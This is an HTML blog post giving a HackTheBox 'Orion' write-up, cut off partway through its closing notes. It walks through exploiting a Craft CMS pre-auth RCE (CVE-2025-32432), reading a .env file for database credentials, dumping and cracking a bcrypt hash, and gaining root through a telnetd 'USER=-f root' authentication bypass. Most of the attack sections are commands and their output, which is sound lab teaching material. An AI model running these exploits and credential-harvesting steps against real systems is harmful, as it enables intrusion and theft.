@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Orion — S. Markakis</title>
+<meta name="description" content="HackTheBox Orion — Craft CMS 5.6.16 falls to the pre-auth Yii2 PhpManager gadget chain (CVE-2025-32432); when access-log poisoning is blocked by a stale marker from a prior attacker, a session-file poisoning variant gets around it for RCE as www-data. A .env leak hands over DB creds, a cracked bcrypt hash gets SSH as adam, and a loopback-only GNU Inetutils telnetd trusts the client's USER environment variable (CVE-2026-24061) for a passwordless root login.">
+<meta property="og:title" content="HTB: Orion — S. Markakis">
+<meta property="og:description" content="Craft CMS pre-auth RCE (CVE-2025-32432) → leaked DB creds → cracked bcrypt → SSH as adam → GNU Inetutils telnetd USER-variable auth bypass (CVE-2026-24061) → root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-orion.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-orion.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-orion.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-orion.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-lin  { background: #d8d0c0; color: #4a3a20; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.74rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p { color: var(--text); margin-bottom: 1rem; }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<style>
+  .htb-cta{display:flex;gap:.6rem;flex-wrap:wrap;margin:1.5rem 0}
+  .htb-cta.top{margin-top:.4rem}
+  .htb-cta a{flex:1 1 220px;display:flex;align-items:center;gap:.75rem;padding:.75rem .9rem;background:var(--bg-code);border:1px solid var(--border);border-radius:8px;text-decoration:none;color:var(--text-dark);font-family:'Barlow',sans-serif;transition:transform .15s,border-color .15s,background .15s}
+  .htb-cta a:hover{transform:translateY(-2px);border-color:var(--text-dark);background:var(--bg-term)}
+  .htb-cta svg{width:20px;height:20px;flex:none;stroke:var(--text-dark);fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+  .htb-cta .l-t{display:block;font-family:'Barlow Condensed',sans-serif;font-weight:600;font-size:1.02rem;letter-spacing:.01em;line-height:1.15;color:var(--text-dark)}
+  .htb-cta .l-s{display:block;font-size:.72rem;color:var(--text-mid);line-height:1.25}
+  .htb-cta .l-x{margin-left:auto;color:var(--text-mid);font-size:.95rem}
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Orion",
+  "description": "HackTheBox Orion — Craft CMS 5.6.16 falls to the pre-auth Yii2 PhpManager gadget chain (CVE-2025-32432); when access-log poisoning is blocked by a stale marker from a prior attacker, a session-file poisoning variant gets around it for RCE as www-data. A .env leak hands over DB creds, a cracked bcrypt hash gets SSH as adam, and a loopback-only GNU Inetutils telnetd trusts the client's USER environment variable (CVE-2026-24061) for a passwordless root login.",
+  "datePublished": "2026-09-11",
+  "dateModified": "2026-09-11",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-orion.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-orion.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-orion"
+  },
+  "timeRequired": "PT7M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <div class="post-header">
+    <h1>HTB: Orion</h1>
+    <div class="post-meta">
+      <span class="date">September 11, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag tag-lin">Linux</span>
+      <span class="tag">CMS</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;7 min read</span>
+    </div>
+  </div>
+
+  <div class="htb-cta top">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+
+  <hr class="divider">
+
+  <div class="overview">
+    Orion looks like a one-CVE box until the exploit fights back. <strong>Craft CMS 5.6.16</strong> is vulnerable to <strong>CVE-2025-32432</strong>, a pre-auth deserialization RCE in the asset-transform pipeline — but the first PoC I reach for depends on poisoning <code>access.log</code>, and someone (the box, or a prior attacker on this shared instance) has already left a stale exit marker in that log that blocks the gadget from re-triggering. Switching to a session-file poisoning variant of the same CVE sidesteps the log entirely and lands RCE as <code>www-data</code>. From there a <code>.env</code> file hands over the Craft database credentials in plaintext, a <code>SELECT</code> against the <code>users</code> table pulls a bcrypt hash, and <strong>rockyou</strong> cracks it in seconds. That's SSH as <code>adam</code> and the user flag — but root is the actual puzzle: a <strong>GNU Inetutils telnetd</strong> is listening on loopback only, and its ancient handling of the telnet <code>USER</code> environment variable (<strong>CVE-2026-24061</strong>) lets a client hand it <code>-f root</code> and get logged straight in as root, no password asked.
+  </div>
+
+  <div class="chain">
+    <span class="chain-node">Craft CMS 5.6.16</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2025-32432 session poisoning</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">www-data</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">.env DB creds</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">cracked bcrypt</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">adam (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2026-24061 telnet USER bypass</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <p>Just SSH and a web front end — nothing hiding behind a vhost this time.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">nmap -sC -sV -Pn &lt;TARGET&gt;</span>
+<span class="po">22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http  nginx 1.18.0 (Ubuntu)</span></div>
+  </div>
+
+  <p>The site on 80 is a <strong>Craft CMS</strong> install. <code>/admin/login</code> leaks the exact build in its footer/asset paths:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">fingerprint</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">curl -s http://orion.htb/admin/login | grep -oE 'Craft [0-9.]+'</span>
+<span class="pg">Craft 5.6.16</span></div>
+  </div>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — Craft CMS CVE-2025-32432, the hard way</h2>
+
+  <p>Craft ≤5.6.16 is vulnerable to <strong>CVE-2025-32432</strong>, an unauthenticated RCE in the asset-transform generation feature. The root cause is a Yii2 gadget chain: Craft's session handler is backed by <code>yii\web\PhpManager</code>-style file storage, and asset-transform generation can be coerced into unserializing attacker-controlled data from that storage, which — through the right gadget — ends in arbitrary PHP execution.</p>
+
+  <h3>First attempt: access-log poisoning fails</h3>
+
+  <p>The natural PoC (<a href="https://github.com/cd-ratel/CVE-2025-32432">cd-ratel/CVE-2025-32432</a>) works by writing a PHP payload into <code>/var/log/nginx/access.log</code> via a crafted <code>User-Agent</code>, then triggering the asset-transform gadget so it <code>include()</code>s the log file and runs the injected code between output markers. It failed on every asset ID:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">access-log variant — blocked</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 craft_exploit.py -u http://orion.htb -c 'id'</span>
+<span class="pr">[!] Markers not found in response</span>
+<span class="pd">$ </span><span class="pc">for a in 1 3 4; do python3 craft_exploit.py -u http://orion.htb -a $a -c 'id'; done</span>
+<span class="pr">[!] Markers not found in response   </span><span class="pco"># same wall on every asset ID</span></div>
+  </div>
+
+  <p>The log itself was the problem: <code>access.log</code> already carried a stale <code>exit;</code> statement from a previous exploitation attempt (this is a shared HTB instance, so someone hit it before me), which short-circuits PHP execution before the gadget's own marker-wrapped payload ever runs. Log-poisoning PoCs are fragile exactly because they depend on a file they don't control the full contents of.</p>
+
+  <h3>Second attempt: PHP session-file poisoning works</h3>
+
+  <p>Switching to <a href="https://github.com/c0gnit00/CVE-2025-32432">c0gnit00/CVE-2025-32432</a> ("CraftCMS2Shell") sidesteps the log path entirely — it poisons Craft's own PHP <strong>session file</strong> (<code>/var/lib/php/sessions/sess_&lt;id&gt;</code>) instead, which nothing else on the box is writing to, and auto-brute-forces the asset ID it needs:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">session-file variant — CVE-2025-32432 → RCE</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 c0_exploit.py -u http://orion.htb -c 'id; hostname'</span>
+<span class="pd">==========================================================
+ CVE-2025-32432 Craft CMS Pre-Auth RCE PoC v2
+ Target: http://orion.htb
+==========================================================
+[+] Stage 1: Getting session cookie and CSRF token...
+[✓] Session ID: vk7548c5bhaoqed5ckt8cme1hm
+[✓] CSRF Token: 8zMA_jiBt5RNje9_noltf3FK9Vj0tP...
+[+] Stage 2: Poisoning session file with PHP code...
+[+] Poison request returned: 200
+[✓] Session file poisoned
+[+] Stage 3: Brute-forcing asset ID (1-300)...
+[✓] Valid asset ID found: 1 (HTTP 200)
+[+] Stage 4: Triggering RCE via PhpManager gadget chain...</span>
+<span class="pg">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+orion</span></div>
+  </div>
+
+  <div class="alert alert-info">Same CVE, two very different PoCs. When a log-poisoning exploit hits a wall, check whether the log is actually clean before assuming the vulnerability is patched — a box that's already been hit once can leave debris that blocks a textbook-correct payload. A session/cache-file poisoning variant that writes to a location nothing else touches is the more reliable primitive when it's available.</div>
+
+  <h3>Reading the leaked .env</h3>
+
+  <p>RCE as <code>www-data</code>, and Craft's own <code>.env</code> in the web root hands over the database credentials outright:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">/var/www/html/craft/.env</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 c0_exploit.py -u http://orion.htb -c 'cat /var/www/html/craft/.env'</span>
+<span class="po">CRAFT_ENVIRONMENT=dev
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+</span><span class="pr">CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</span></div>
+  </div>
+
+  <p>Root MySQL creds. Straight to the <code>users</code> table for a hash to crack:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">DB → bcrypt hash</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 c0_exploit.py -u http://orion.htb -c \
+     'mysql -h127.0.0.1 -uroot -pSuperSecureCraft123Pass! orion -N -e "SELECT username,email,password FROM users;"'</span>
+<span class="po">admin   adam@orion.htb   </span><span class="pg">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</span></div>
+  </div>
+
+  <p>Bcrypt cost 13 is slow, but the CMS admin behind a "simple" box usually reuses an early rockyou entry. It does:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">hashcat -m 3200</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">hashcat -m 3200 adam.hash rockyou.txt --quiet -o adam.cracked --potfile-disable</span>
+<span class="pd">$ </span><span class="pc">cat adam.cracked</span>
+<span class="pg">$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel</span></div>
+  </div>
+
+  <div class="alert alert-success"><code>adam : darkangel</code> — and Craft's own admin account email doubled as the system username, so no guessing needed there either.</div>
+
+  <p><code>www-data</code> couldn't read <code>/home/adam</code> directly (mode <code>750</code>, owned <code>adam:adam</code>), so this credential is the only way in. SSH confirms it and drops the user flag:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">adam → user.txt</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ssh adam@orion.htb</span><span class="ps"> (darkangel)</span>
+<span class="pu">adam</span><span class="ps">@</span><span class="ph">orion</span><span class="ps">:~$ </span><span class="pc">id</span>
+<span class="po">uid=1000(adam) gid=1000(adam) groups=1000(adam)</span>
+<span class="pu">adam</span><span class="ps">@</span><span class="ph">orion</span><span class="ps">:~$ </span><span class="pc">cat ~/user.txt</span>
+<span class="pg">8b8f53d6ff09f9485b67e3246f2861e7</span></div>
+  </div>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>Root — telnetd trusts your USER variable (CVE-2026-24061)</h2>
+
+  <p><code>sudo -l</code> is a dead end — <code>adam</code> has no rule, not even a NOPASSWD one — and <code>/root/root.txt</code> is a flat permission denied. No SUID oddities either; the box wants a service, not a local binary. Checking listeners turns up something on loopback:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">sudo -l / listeners</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">sudo -l</span>
+<span class="pr">sudo: a password is required   </span><span class="pco"># no NOPASSWD rule at all</span>
+<span class="pd">$ </span><span class="pc">ss -lntp</span>
+<span class="po">LISTEN 0 10 </span><span class="pg">127.0.0.1:23</span><span class="po"> 0.0.0.0:*   </span><span class="pco"># telnet — internal only</span></div>
+  </div>
+
+  <p>A telnet daemon reachable only from the box itself is a strong tell. Checking what's actually listening:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">telnetd version</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">dpkg -l | grep -iE "inetutils|telnet"</span>
+<span class="pg">GNU Inetutils 2.2   </span><span class="pco"># in the vulnerable range</span></div>
+  </div>
+
+  <p><strong>GNU Inetutils</strong> telnetd 1.9.3–2.7 is vulnerable to <strong>CVE-2026-24061</strong> (CVSS 9.8): it honors the telnet client's <code>ENVIRON</code> negotiation and passes whatever the client claims as the <code>USER</code> variable straight into <code>login</code> as an argument, unsanitized. A client that negotiates <code>USER=-f root</code> makes telnetd run:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">what the daemon actually executes</span>
+    </div>
+    <div class="term-body"><span class="pc">login -f root       </span><span class="pco"># -f = "already authenticated, don't ask"</span></div>
+  </div>
+
+  <p><code>login -f</code> is meant for trusted callers like <code>getty</code>, not for an argument a remote telnet client gets to choose. The daemon never sanity-checks it, so it's an authentication bypass disguised as an argument-injection bug.</p>
+
+  <h3>The dead ends before the working exploit</h3>
+
+  <p>The netkit <code>telnet</code> client's <code>-l</code> flag is meant to do exactly this (<code>telnet -l '-froot' 127.0.0.1 23</code>), but piping commands into it non-interactively through an SSH <code>exec_command</code> channel doesn't work — the client never allocates a real TTY, the telnet <strong>IAC/ENVIRON</strong> negotiation gets eaten before login can happen, and the connection just closes. Scripting the raw socket protocol by hand from an SSH heredoc hit the same wall for the same reason: no PTY, negotiation half-completes, nothing comes back.</p>
+
+  <p>Searching GitHub for a ready PoC turned up one that looked promising and turned out to be a landmine: <code>jacubes/CVE-2026-24061</code> is <strong>not</strong> a telnet exploit at all — its <code>rce.py</code> calls out to <code>_fetch_bytes(url, api_key)</code> → <code>_load_module_memory(...)</code> → <code>bootstrap(...)</code>, i.e. it downloads and executes attacker-controlled code from a remote server the moment you run it. Declined — that's a backdoor wearing a CVE number, not a PoC.</p>
+
+  <div class="alert alert-warn">Vet a PoC before running it, especially for a fresh CVE with few public repos. A script that resolves a remote URL and hands the response to <code>exec</code>/<code>eval</code>/dynamic import isn't reproducing the vulnerability — it's asking you to trust an unknown third party with code execution on the box (and possibly your own machine, depending on where it runs).</div>
+
+  <p>The real fix was a PoC that implements the telnet protocol negotiation properly instead of relying on the interactive client — <a href="https://github.com/Ish3ng0m4/CVE-2026-24061-Telnetd">Ish3ng0m4/CVE-2026-24061-Telnetd</a> speaks raw <code>IAC</code>/<code>DO</code>/<code>WILL</code>/<code>SB ENVIRON</code> over a plain socket, injects <code>USER=-f root</code> in the subnegotiation, and reads the shell straight off the wire — no TTY required:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">CVE-2026-24061 → root</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">python3 cve_2026_24061.py 127.0.0.1 23</span>
+<span class="pr">  CVE-2026-24061</span><span class="po"> - GNU Inetutils telnetd Auth Bypass
+
+[*] Target: </span><span class="pb">127.0.0.1:23</span>
+<span class="pg">[+] Connected
+[*] Injected USER=-f root
+[+] VULNERABLE</span>
+
+<span class="po">Linux 5.15.0-177-generic (orion) (pts/0)
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-177-generic x86_64)
+...
+IPv4 address for eth0: 10.129.130.158</span>
+<span class="pu">root</span><span class="ps">@</span><span class="ph">orion</span><span class="ps">:~# </span><span class="pc">id</span>
+<span class="po">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="pu">root</span><span class="ps">@</span><span class="ph">orion</span><span class="ps">:~# </span><span class="pc">cat /root/root.txt</span>
+<span class="pg">7a0bfb732fb94c235fa44b7d884837be</span></div>
+  </div>
+
+  <div class="alert alert-success">No password, no exploit chain within the daemon itself — telnetd simply believed the client's claim about who it was. Binding it to loopback limited the blast radius to local users, but <code>adam</code> was always going to get there once he had a shell at all. The only real fix is not running telnetd — SSH has made it obsolete for exactly this class of bug.</div>
+
+  <!-- ══ macOS NOTES ══ -->
+  <h2>macOS operator notes</h2>
+
+  <p>No Metasploit on the attack host, so both CVEs ran through standalone Python PoCs rather than a module. The pattern that mattered most was making everything <strong>scriptable and non-interactive</strong>:</p>
+
+  <ul>
+    <li><strong>HTTP RCE as a function, not a shell.</strong> The session-poisoning PoC's <code>-c CMD</code> mode returns command output directly in the HTTP response — no need for a reverse shell just to read a <code>.env</code> file or query MySQL. Kept the whole enumeration phase to one-shot <code>curl</code>-style calls.</li>
